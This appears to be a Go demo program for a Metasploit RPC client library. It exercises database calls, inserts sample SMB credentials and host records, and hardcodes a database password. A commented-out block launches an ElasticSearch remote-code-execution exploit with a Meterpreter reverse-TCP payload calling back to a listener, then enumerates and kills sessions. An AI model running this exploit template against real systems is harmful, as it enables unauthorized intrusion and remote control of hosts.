package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/fpr1m3/go-msf-rpc/rpc"
)

func checkErr(reason string, err error) bool {
	if err != nil {
		log.Println(fmt.Errorf("%s: %s", reason, err))
		return true
	}
	return false
}

func checkFatalErr(reason string, err error) {
	if checkErr(reason, err) {
		os.Exit(0)
	}
}

func main() {
	host := os.Getenv("MSFHOST")
	user := os.Getenv("MSFUSER")
	pass := os.Getenv("MSFPASS")

	for _, val := range []string{host, user, pass} {
		if len(val) == 0 {
			log.Fatalln("Missing required environment variable MSFHOST, MSFUSER, or MSFPASS")
		}
	}

	msf, err := rpc.New(host, user, pass)
	if err != nil {
		log.Panicln(err)
	}
	defer msf.Logout()

	dbStatus, err := msf.DBStatus()
	checkFatalErr("Unable to get DB status", err)
	log.Printf("%+v\n", dbStatus)
	dbAddWorkspaceRes, err := msf.DBAddWorkspace("fart chamber")
	checkFatalErr("Unable to add DB workspace", err)
	log.Printf("%s\n", dbAddWorkspaceRes.Result)
	dbAnalyzeHostRes, err := msf.DBAnalyzeHost("default", "192.168.1.3")
	checkFatalErr("Unable to DB analyze host", err)
	log.Printf("%+v\n", dbAnalyzeHostRes)
	dbClientsRes, err := msf.DBClients(map[string]interface{}{"workspace": "default"})
	checkFatalErr("Unable to DB clients", err)
	log.Printf("%+v\n", dbClientsRes)
	dbConnectRes, err := msf.DBConnect(map[string]interface{}{
		"driver":   "postgresql",
		"host":     "localhost",
		"port":     "5433",
		"database": "msf",
		"username": "msf",
		"password": "ZOOFLwvMyUMSFAXsWyW466i2pDFh2O4fr/euw39KO5M=",
	})
	checkFatalErr("Unable to DB connect", err)
	log.Printf("%+v\n", dbConnectRes)
	dbCredsRes, err := msf.DBCreds(map[string]interface{}{"workspace": "default"})
	checkFatalErr("Unable to DB creds", err)
	log.Printf("%+v\n", dbCredsRes)
	dbCurrentWorkspaceRes, err := msf.DBCurrentWorkspace()
	checkFatalErr("Unable to DB current workspace", err)
	log.Printf("%+v\n", dbCurrentWorkspaceRes)
	dbEventsRes, err := msf.DBEvents(map[string]interface{}{
		"workspace": "default",
		"limit":     uint32(500),
		"offset":    uint32(0),
	})
	checkFatalErr("Unable to DB events", err)
	log.Printf("%d", len(dbEventsRes.Events))
	log.Printf("%+v\n", dbEventsRes)
	dbWorkspacesRes, err := msf.DBWorkspaces()
	checkFatalErr("Unable to DB workspaces", err)
	log.Printf("%+v\n", dbWorkspacesRes)
	t := time.Unix(dbWorkspacesRes.Workspaces[0].CreatedAt, 0)
	log.Printf("%s\n", t)
	healthCheckRes, err := msf.HealthCheck()
	checkFatalErr("Unable to perform a health check", err)
	log.Printf("%+v", healthCheckRes)
	dbCreateCrackedCredentialRes, err := msf.DBCreateCrackedCredential(map[string]interface{}{
		"username": "blahblah",
		"password": "Metasploit::Credential::Username",
		"core_id":  0,
		// "address":         "192.168.1.100",
		// "port":            445,
		// "service_name":    "smb",
		// "protocol":        "tcp",
		// "module_fullname": "auxiliary/scanner/smb/smb_login",
		// "workspace_id":    "default",
		//"private_data":    "password1",
		//"private_type":    "password",
	})
	checkErr("Unable to create cracked cred", err)
	log.Printf("%+v\n", dbCreateCrackedCredentialRes)
	dbCreateCredentialRes, err := msf.DBCreateCredential(map[string]interface{}{
		"origin_type":     "service",
		"address":         "192.168.1.3",
		"port":            445,
		"service_name":    "smb",
		"protocol":        "tcp",
		"module_fullname": "auxiliary/scanner/smb/smb_login",
		"workspace_id":    8,
		"private_data":    "password1",
		"private_type":    "password",
		"username":        "Administrator",
		"realm":           "WORKGROUP",
	})
	checkErr("Unable to create cred", err)
	log.Printf("%+v\n", dbCreateCredentialRes)
	dbDeleteClientRes, err := msf.DBDeleteClient(map[string]interface{}{})
	checkErr("Unable to delete clients", err)
	log.Printf("%+v\n", dbDeleteClientRes)
	dbDeleteCredsRes, err := msf.DBDeleteCreds(map[string]interface{}{
		"workspace": "default",
	})
	checkErr("Unable to delete creds", err)
	log.Printf("%+v\n", dbDeleteCredsRes)
	dbDeleteHostRes, err := msf.DBDeleteHost(map[string]interface{}{
		"workspace": "default",
		"address":   "192.168.1.3",
	})
	checkErr("Unable to delete hosts", err)
	log.Printf("%+v\n", dbDeleteHostRes)
	dbDeleteNoteRes, err := msf.DBDeleteNote(map[string]interface{}{
		"workspace": "default",
	})
	checkErr("Unable to delete notes", err)
	log.Printf("%+v\n", dbDeleteNoteRes)
	dbDeleteWorkspaceRes, err := msf.DBDeleteWorkspace("fart chamber")
	checkErr("Unable to delete workspace", err)
	log.Printf("%+v\n", dbDeleteWorkspaceRes)

	dbReportClientRes, err := msf.DBReportClient(map[string]interface{}{
		"workspace": "default",
		"ua_string": "Chrome or something",
		"host":      "192.168.1.3",
		"ua_name":   "Chrome",
		"ua_ver":    "v69",
	})
	checkErr("Unable to reporting client", err)
	log.Printf("%+v\n", dbReportClientRes)
	dbReportEventRes, err := msf.DBReportEvent(map[string]interface{}{
		"workspace": "default",
		"username":  "Administrator",
		"host":      "192.168.1.3",
	})
	checkErr("Unable to reporting event", err)
	log.Printf("%+v\n", dbReportEventRes)
	dbReportHostRes, err := msf.DBReportHost(map[string]interface{}{
		"workspace":    "default",
		"host":         "192.168.1.4",
		"state":        "alive",
		"os_name":      "Windows",
		"os_flavor":    "Home",
		"os_sp":        "2004",
		"os_lang":      "English",
		"arch":         "x86",
		"mac":          "FE:ED:DE:AD:BE:EF",
		"scope":        "test",
		"virtual_host": "QEMU",
	})
	checkErr("Unable to reporting host", err)
	log.Printf("%+v\n", dbReportHostRes)
	// coreVersion, err := msf.CoreVersion()
	// checkFatalErr("Unable to get core version.", err)
	// log.Printf("Connected to Metasploit...\n\tVersion: %s\n\tRuby: %s\n\tAPI: %s", coreVersion.Version, coreVersion.Ruby, coreVersion.Api)
	// msfEncodeRes, err := msf.ModuleEncode("AAAA", "x86/shikata_ga_nai", map[string]string{"format": "python"})
	// checkErr("Issue with MSF encode request", err)
	// log.Printf("Data returned:\n%s\n", msfEncodeRes.Encoded)
	// log.Printf("Target acquired... ElasticSearch...\n")
	// moduleType := "exploit"
	// moduleName := "multi/elasticsearch/script_mvel_rce"
	// moduleOptions := map[string]string{
	// 	"RHOSTS":      "192.168.1.131",
	// 	"RPORT":       "9200",
	// 	"SSL":         "false",
	// 	"TARGETURI":   "/",
	// 	"WritableDir": "/tmp",
	// 	"LHOST":       "192.168.1.130",
	// 	"LPORT":       "4444",
	// 	"PAYLOAD":     "java/meterpreter/reverse_tcp",
	// }
	// execResp, err := msf.ModuleExecute(moduleType, moduleName, moduleOptions)
	// checkFatalErr("Unable to execute module %s", err)
	// log.Printf("Your new job ID is... %d\nCurrently waiting 5 seconds for module to complete.\n", execResp.JobId)
	// time.Sleep(time.Second * 5)
	// sessionList, err := msf.SessionList()
	// checkErr("Unable to get session list", err)
	// var sessionNumber uint32
	// for i, val := range sessionList {
	// 	log.Printf("Here is the information of Session %d\n", i)
	// 	sessionNumber = i
	// 	log.Printf("\tType:%s\n", val.Type)
	// 	log.Printf("\tVia Exploit:%s\n", val.ViaExploit)
	// 	log.Printf("Killing Session %d", i)
	// 	result, err := msf.SessionMeterpreterSessionKill(sessionNumber)
	// 	checkErr("Unable to get kill meterpreter session results", err)
	// 	log.Printf("Result: %s", result.Result)
	// }
}
